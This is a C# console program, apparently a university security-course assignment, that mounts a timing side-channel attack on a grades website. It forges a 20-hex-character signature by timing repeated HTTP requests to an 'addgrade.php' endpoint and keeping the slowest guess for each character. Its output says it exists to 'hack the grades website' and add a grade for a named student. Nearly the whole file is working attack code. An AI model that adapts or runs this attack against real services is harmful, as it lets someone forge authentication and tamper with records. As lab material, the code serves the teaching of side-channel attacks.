using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;

namespace UnsecureSite
{
    class Program
    {
        private static char[] possibleValues = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
        private static string name;
        private static string grade;

        private static int nbrOfIterations = 10;
        private static int tolerance = 400;
        private static int startIndex;

        static void Main(string[] args)
        {
            Console.WriteLine("Welcome to the hacking of the grades website"); // Anna - 3
            name = "Anna"; /* Console.ReadLine(); */
            grade = "3"; /* Console.ReadLine(); */

            Console.WriteLine("Want to give the signature a headstart (leave empty if not): ");
            var sigStart = Console.ReadLine();
            startIndex = sigStart.Length;
            var foundSignature = false;
            var signaturesFound = new List<string>();
            
            while (!foundSignature && signaturesFound.Count < 30)
            {
                var startTime = DateTime.Now;
                try
                {
                    var signature = generateASignature(sigStart);
                    Console.WriteLine("Found signature: {0}", signature);
                    var result = makeCall(signature);
                    Console.WriteLine(result == "\n1" ? "Signature was accepted" : "Signature was rejected");
                    foundSignature = result == "\n1";
                    signaturesFound.Add(signature.ToString());
                    if(!foundSignature)
                        Console.WriteLine("Failed try {0} to find signature, makes a new atempt", signaturesFound.Count);
                    saveToFile(signature);
                    var endTime = DateTime.Now;
                    var timeElapsed = endTime.Subtract(startTime);
                    var end = new StringBuilder();
                    end.AppendFormat("Time to find signature: {0}:{1}:{2}", timeElapsed.Hours, timeElapsed.Minutes, timeElapsed.Seconds);
                    saveToFile(end);
                }
                catch (Exception)
                {
                    signaturesFound.Add("00000000000000000000");
                    Console.WriteLine("Failed try {0} to find signature, makes a new atempt", signaturesFound.Count);

                    var endTime = DateTime.Now;
                    var timeElapsed = endTime.Subtract(startTime);
                    var end = new StringBuilder();
                    end.AppendFormat("Time spent in search of signature: {0}:{1}:{2}", timeElapsed.Hours, timeElapsed.Minutes, timeElapsed.Seconds);
                    saveToFile(end);
                }
            }
          
            Console.WriteLine("The last signature was accepted by the server.");

            Console.WriteLine("Press any key to quit");
            Console.ReadKey();
        }

        private static StringBuilder generateASignature(string sigStart)
        {
            var signature = new StringBuilder(sigStart);
            for (int i = signature.Length; i < 20; i++)
                signature.Append("0");

            try
            {
                MakeTimedCall(signature);
                getSignature(signature);
            }
            catch (ArgumentException ex)
            {
                saveToFile(signature);
                Console.WriteLine(
                    "Failed to generate a signature, to much distrubance in the connection with the server. Generated signature resulted in {0}",
                    signature);
            }
            return signature;
        }

        private static void getSignature(StringBuilder signature)
        {
            var requestTime = new Dictionary<char, List<double>>();
            var timeList = new List<double> {0.0};

            for (var i = startIndex; i < 20; i++)
            {
                var timesBacktrack = 0; 
                requestTime.Clear();
                var time = calculateSignatureChar(requestTime, signature, i);
                if (time - timeList[i - startIndex] < 10)
                {
                    if (timesBacktrack > 30)
                    {
                        saveToFile(signature);
                        throw new ArgumentException($"After 30 backtracks couldn't find the value for index {i}");
                    }
                    timesBacktrack = timesBacktrack + 1;
                    Console.WriteLine("\n\n Time not incresed so backtracking from index {0} to index {1} \n\n",i, i);
                    if (i > 1)
                    {
                        signature[i - 1] = '0';
                        signature[i] = '0';
                        i = i - 2;
                        timeList.Remove(timeList.Last());
                    }
                    else
                    {
                        i = -1;
                        signature[0] = '0';
                        signature[1] = '0';
                    }
                   
                }
                else
                {
                    if (timeList.Count + startIndex -1 == i)
                        timeList.Add(time);
                    else
                        timeList[i - startIndex + 1] = time;
                }
            }
        }

        private static double calculateSignatureChar(Dictionary<char, List<double>> requestTime, StringBuilder signature,
            int i, int retry = 0)
        {
            collectData(requestTime, signature, i);
            try
            {
                var averageTime = analyseData(requestTime);

                if (averageTime.Count(x => x == averageTime.Max()) > 1)
                {
                    return calculateSignatureChar(requestTime, signature, i);
                }

                var maxIndex = averageTime.IndexOf(averageTime.Max());
                Console.WriteLine("Roundtrip time: {0}ms", averageTime[maxIndex]);
                signature[i] = possibleValues[maxIndex];
                requestTime.Clear();
                return averageTime[maxIndex];
            }
            catch (ArgumentException ex)
            {
                if (retry < 5)
                {
                    requestTime.Clear();
                    Console.WriteLine(
                        "\n\nRetrying for hex at place {0}, difference from average last round was {1} ms\n\n", i,
                        ex.Message);
                    return calculateSignatureChar(requestTime, signature, i, retry + 1);
                }
                saveToFile(signature);
                throw;
            }
        }

        protected static List<double> analyseData(Dictionary<char, List<double>> data)
        {
            var average = new List<double>();
            for (var i = 0; i < possibleValues.Length; i++)
            {
                var series = data.Single(x => x.Key == possibleValues[i]).Value;
                var avg = series.Average();
                var seriesWithinAverage = series.Where(x => Math.Abs(x - avg) < tolerance); // 100 ms tolerance
                if (series.Count - seriesWithinAverage.Count() > 3)
                    throw new ArgumentException(series.Max(x => Math.Abs(x - avg))
                        .ToString(CultureInfo.InvariantCulture));

                average.Add(seriesWithinAverage.Average());
            }

            return average;
        }

        private static void collectData(Dictionary<char, List<double>> requestTime, StringBuilder signature, int i)
        {
            for (var j = 0; j < nbrOfIterations; j++)
            {
                Console.WriteLine("Starting round {0}", j);
                for (var k = 0; k < 16; k++)
                {
                    if (j == 0 && requestTime.All(x => x.Key != possibleValues[k]))
                        requestTime.Add(possibleValues[k], new List<double>());

                    signature[i] = possibleValues[k];
                    var time = MakeTimedCall(signature);
                    requestTime.Single(x => x.Key == possibleValues[k]).Value.Add(time);
                }
            }
        }

        private static double MakeTimedCall(StringBuilder signature)
        {

            using (var client = new HttpClient())
            {
                client.Timeout = new TimeSpan(0, 0, 0, 5);
               
                var startTime = DateTime.Now;
                var response =
                    client.GetAsync(
                        $"https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name={name}&grade={grade}&signature={signature}");
                var result = response.Result;
                var endTime = DateTime.Now;
                var time = endTime.Subtract(startTime).TotalMilliseconds;
                Console.WriteLine("Making a call for signature {0}, took time {1} ms", signature, time);
                return time;
            }

        }

        private static string makeCall(StringBuilder signature)
        {
            var url =
                  $"https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name={name}&grade={grade}&signature={signature}";
            var startTime = DateTime.Now;
            var request = WebRequest.CreateHttp(url);

            //request.Accept = "application/xrds+xml";  
            var response = (HttpWebResponse)request.GetResponse();
            var endTime = DateTime.Now;

            using (var reader = new System.IO.StreamReader(response.GetResponseStream(), Encoding.ASCII))
            {
                return reader.ReadToEnd();
            }
        }

        private static void saveToFile(StringBuilder signature)
        {
            var dataFile = new Uri(new Uri(AppDomain.CurrentDomain.BaseDirectory), "data.txt");
            var settingsFileWriter = new StreamWriter(dataFile.AbsolutePath);
            settingsFileWriter.WriteLine(signature);
            settingsFileWriter.Flush();
            settingsFileWriter.Close();
        }
    }
}
